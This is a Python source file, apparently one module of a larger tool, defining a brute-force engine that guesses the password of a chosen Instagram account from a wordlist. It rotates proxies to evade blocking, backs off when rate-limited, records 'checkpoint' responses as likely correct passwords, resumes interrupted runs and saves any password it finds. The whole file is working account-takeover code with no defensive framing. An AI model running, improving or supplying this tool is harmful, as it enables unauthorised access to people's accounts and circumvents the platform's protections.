#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Brute Force Engine — password testing against Instagram."""

import json
import os
import random
import time
from .api import InstagramAPI
from .proxy import ProxyManager
from .banner import info, ok, warn, err, C


class BruteEngine:
    """Password testing engine with proxy rotation and resume support."""

    def __init__(self, username, wordlist_path, output_dir="output",
                 delay_min=3.0, delay_max=5.0, proxy=None, proxy_file=None,
                 resume=False):
        self.username = username
        self.wordlist_path = wordlist_path
        self.output_dir = output_dir
        self.delay_min = delay_min
        self.delay_max = delay_max

        # Proxy
        self.proxy_mgr = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
        self.proxy_mgr.validate_all()

        # API
        self.api = InstagramAPI()

        # State
        self._found = None
        self._tried = set()
        self._cursor = 0
        self._checkpoints = []

        # Files
        os.makedirs(os.path.join(output_dir, username), exist_ok=True)
        self.progress_file = os.path.join(output_dir, username, "progress.json")
        self.found_file = os.path.join(output_dir, username, "found.txt")
        self.checkpoint_file = os.path.join(output_dir, username, "checkpoints.txt")

        if resume:
            self._load_progress()

    # ── Progress ──────────────────────────────────────

    def _load_progress(self):
        try:
            with open(self.progress_file, "r") as f:
                data = json.load(f)
                self._tried = set(data.get("tried", []))
                self._cursor = data.get("cursor", 0)
                info(f"Resumed: {self._cursor} already tested")
        except Exception:
            pass

    def _save_progress(self):
        try:
            with open(self.progress_file, "w") as f:
                json.dump({
                    "tried": list(self._tried)[-10000:],
                    "cursor": self._cursor,
                }, f)
        except Exception:
            pass

    # ── Run ───────────────────────────────────────────

    def run(self):
        """Execute brute force attack."""
        # Load passwords
        passwords = []
        with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                pw = line.strip()
                if pw and pw not in self._tried:
                    passwords.append(pw)

        if not passwords:
            warn("No new passwords to test — all already tried or wordlist empty")
            return self._load_result()

        total = len(passwords)
        info(f"Testing {total} passwords against @{self.username}")
        info(f"Delay: {self.delay_min}s–{self.delay_max}s | Proxies: {self.proxy_mgr.alive_count}")

        start_time = time.time()

        for i, password in enumerate(passwords, 1):
            if self._found:
                break

            self._cursor += 1
            self._tried.add(password)

            # Rotate proxy
            proxy_url = self.proxy_mgr.get_next()
            if proxy_url:
                self.api.proxy = self.proxy_mgr.get_proxies_dict(proxy_url)

            # Try login
            result = self.api.try_login(self.username, password)

            # Handle result
            if result.get("success"):
                self._found = password
                ok(f"FOUND! Password: {password}")
                break
            elif result["status"] == "checkpoint":
                warn(f"CHECKPOINT: {password} (password may be correct!)")
                self._checkpoints.append(password)
                with open(self.checkpoint_file, "a") as f:
                    f.write(f"{password}\n")
            elif result["status"] == "rate_limited":
                warn("RATE LIMITED — increasing delay...")
                time.sleep(random.uniform(30, 60))
            elif result["status"] == "invalid_user":
                err(f"Username @{self.username} not found — stopping")
                break

            # Progress display
            if i % 10 == 0 or self._found:
                elapsed = time.time() - start_time
                rate = i / elapsed if elapsed > 0 else 0
                pct = (i / total) * 100
                info(f"[{i}/{total}] {pct:.1f}% | {rate:.1f} req/s | "
                     f"Found: {self._found or 'none'} | Checkpoints: {len(self._checkpoints)}")

            # Save progress
            if i % 50 == 0:
                self._save_progress()

            # Delay
            delay = random.uniform(self.delay_min, self.delay_max)
            time.sleep(delay)

        # Final save
        self._save_progress()

        # Summary
        elapsed = time.time() - start_time
        print(f"\n{C.C}{'═' * 45}{C.E}")
        print(f"  Attack Complete — @{self.username}")
        print(f"  Time      : {elapsed:.0f}s")
        print(f"  Tested    : {i}")
        print(f"  Found     : {self._found or 'none'}")
        print(f"  Checkpoints: {len(self._checkpoints)}")
        if self._checkpoints:
            print(f"  Checkpoint file: {self.checkpoint_file}")
        print(f"{C.C}{'═' * 45}{C.E}")

        if self._found:
            self._save_found()

        return self._found

    def _save_found(self):
        with open(self.found_file, "w") as f:
            f.write(self._found)

    def _load_result(self):
        try:
            with open(self.found_file, "r") as f:
                return f.read().strip()
        except Exception:
            return None
